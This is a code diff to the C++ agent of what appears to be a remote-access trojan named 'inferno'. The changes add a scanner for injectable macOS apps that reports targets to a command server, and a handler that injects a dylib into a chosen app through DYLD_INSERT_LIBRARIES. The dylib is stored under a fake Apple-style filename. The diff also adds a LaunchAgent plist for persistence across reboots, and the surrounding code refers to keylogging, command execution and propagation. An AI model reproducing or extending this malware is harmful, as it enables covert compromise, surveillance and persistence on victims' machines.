@@ -1,5 +1,7 @@
 #include "../include/Agent.hpp"
 #include "../include/entry_dylib.hpp"
+#include "../include/EntitlementScanner.hpp"
+#include "../include/MachInjector.hpp"
 #include <iostream>
 #include <cstdio>
 #include <cstdlib>
@@ -28,14 +30,25 @@
 #ifdef __APPLE__
 #include <IOKit/IOKitLib.h>
 #include <CoreFoundation/CoreFoundation.h>
+#include <mach-o/dyld.h>
 #endif
 
 namespace inferno {
 
-Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_reconnect_delay(MIN_BACKOFF) {}
+static std::string getAgentDylibPath() {
+#ifdef __APPLE__
+    const char* home = ::getenv("HOME");
+    return home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
+                : "/tmp/.inferno_agent.dylib";
+#else
+    return {};
+#endif
+}
+
+Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::Agent(const std::string& server_ip, uint16_t server_port)
-    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_reconnect_delay(MIN_BACKOFF) {}
+    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::~Agent() {
     stop();
@@ -172,6 +185,51 @@ void Agent::handleDispatching(Packet&& packet) {
         Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
         std::vector<uint8_t> data = res.serialize();
         m_socket.sendData(data);
+
+        // Tier 2: scan for injectable apps and report all targets to server
+        std::string scan_report = "none||0|0";
+        try {
+            auto targets = inferno::tier2::scanApplications();
+            if (!targets.empty()) {
+                // Determine current host process to mark which target is already injected
+                std::string host_path;
+#ifdef __APPLE__
+                uint32_t bufsize = 0;
+                _NSGetExecutablePath(nullptr, &bufsize);
+                std::vector<char> exec_buf(bufsize);
+                if (_NSGetExecutablePath(exec_buf.data(), &bufsize) == 0) {
+                    host_path = std::string(exec_buf.data());
+                }
+#endif
+                std::vector<std::string> records;
+                for (const auto& t : targets) {
+                    bool is_host = !host_path.empty() && t.executable_path == host_path;
+                    records.push_back(t.path + "|" + t.bundle_id + "|"
+                                    + std::to_string(static_cast<int>(t.capability)) + "|"
+                                    + (is_host ? "1" : "0"));
+                }
+                scan_report.clear();
+                for (size_t i = 0; i < records.size(); ++i) {
+                    if (i > 0) scan_report += "\n";
+                    scan_report += records[i];
+                }
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "[Agent] Scanner failed: " << e.what() << std::endl;
+            scan_report = "none||0|0";
+        } catch (...) {
+            std::cerr << "[Agent] Scanner failed with unknown error" << std::endl;
+            scan_report = "none||0|0";
+        }
+        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
+        data = scan_res.serialize();
+        m_socket.sendData(data);
+
+        // Persist for reboot survival (only once per session)
+        if (!m_persistence_installed) {
+            persistInjectedAgent(m_server_ip, m_server_port);
+            m_persistence_installed = true;
+        }
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
@@ -198,6 +256,8 @@ void Agent::handleDispatching(Packet&& packet) {
         handleKeylogDump();
     } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE)) {
         handlePropagation(std::move(packet));
+    } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
+        handleInjection(std::move(packet));
     }
 }
 
@@ -281,6 +341,36 @@ void Agent::handlePropagation(Packet&& packet) {
 
     Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
                std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+}
+
+void Agent::handleInjection(Packet&& packet) {
+    const auto& raw = packet.getPayload();
+    if (raw.empty()) {
+        Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
+        m_socket.sendData(res.serialize());
+        return;
+    }
+
+    std::string target_path(raw.begin(), raw.end());
+    std::cout << "[Agent] Injection requested into: " << target_path << std::endl;
+
+    // Build TargetApp on the fly — capability defaults to DYLD_INSERT_LIBRARIES
+    inferno::tier2::TargetApp target;
+    target.executable_path = target_path;
+    target.path = target_path;
+    target.capability = inferno::tier2::InjectionCapability::DYLD_INSERT_LIBRARIES;
+
+    std::string dylib_path = getAgentDylibPath();
+
+    bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
+                                                     m_server_ip, m_server_port);
+
+    std::string result = target_path + "||"
+                       + std::to_string(static_cast<int>(target.capability)) + "|"
+                       + (success ? "1" : "0");
+
+    Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
     m_socket.sendData(res.serialize());
 }
 
@@ -499,6 +589,91 @@ X-GNOME-Autostart-enabled=true
     ::fclose(f);
 #endif
 }
+
+#ifdef __APPLE__
+static std::string escapeXml(const std::string& s) {
+    std::string out;
+    out.reserve(s.size());
+    for (char c : s) {
+        switch (c) {
+            case '&':  out += "&amp;"; break;
+            case '<':  out += "&lt;"; break;
+            case '>':  out += "&gt;"; break;
+            case '"':  out += "&quot;"; break;
+            case '\'': out += "&apos;"; break;
+            default:   out += c;
+        }
+    }
+    return out;
+}
+
+void Agent::persistInjectedAgent(const std::string& server_ip,
+                                  uint16_t server_port) {
+    // Get the host executable path
+    uint32_t bufsize = 0;
+    _NSGetExecutablePath(nullptr, &bufsize);
+    std::vector<char> exec_buf(bufsize);
+    if (_NSGetExecutablePath(exec_buf.data(), &bufsize) != 0) return;
+    std::string exec_path(exec_buf.data());
+
+    // If we're in the shim, fall back to standard persistence
+    if (exec_path.find("inferno_shim") != std::string::npos) {
+        installPersistence(exec_path, server_ip, server_port);
+        return;
+    }
+
+    // We're inside a real app — the executable path is the target for launchd
+    // Use the executable directly (not /usr/bin/open -a) because modern macOS
+    // strips DYLD_INSERT_LIBRARIES when launched via LaunchServices.
+
+    const char* home = ::getenv("HOME");
+    if (!home) return;
+
+    std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
+    std::string plist_path = plist_dir + "/com.inferno.agent.plist";
+    std::string dylib_path = getAgentDylibPath();
+
+    ::mkdir(plist_dir.c_str(), 0755);
+
+    mode_t old_mask = ::umask(022);
+    FILE* f = ::fopen(plist_path.c_str(), "w");
+    ::umask(old_mask);
+    if (!f) return;
+
+    std::string port_str = std::to_string(server_port);
+    std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.inferno.agent</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>%s</string>
+    </array>
+    <key>EnvironmentVariables</key>
+    <dict>
+        <key>DYLD_INSERT_LIBRARIES</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_IP</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_PORT</key>
+        <string>%s</string>
+    </dict>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <false/>
+</dict>
+</plist>
+)", escapeXml(exec_path).c_str(), escapeXml(dylib_path).c_str(),
+   escapeXml(server_ip).c_str(), escapeXml(port_str).c_str());
+    ::fclose(f);
+}
+#else
+void Agent::persistInjectedAgent(const std::string&, uint16_t) {}
+#endif
 
 std::string Agent::getHardwareUUID() {
 #ifdef _WIN32
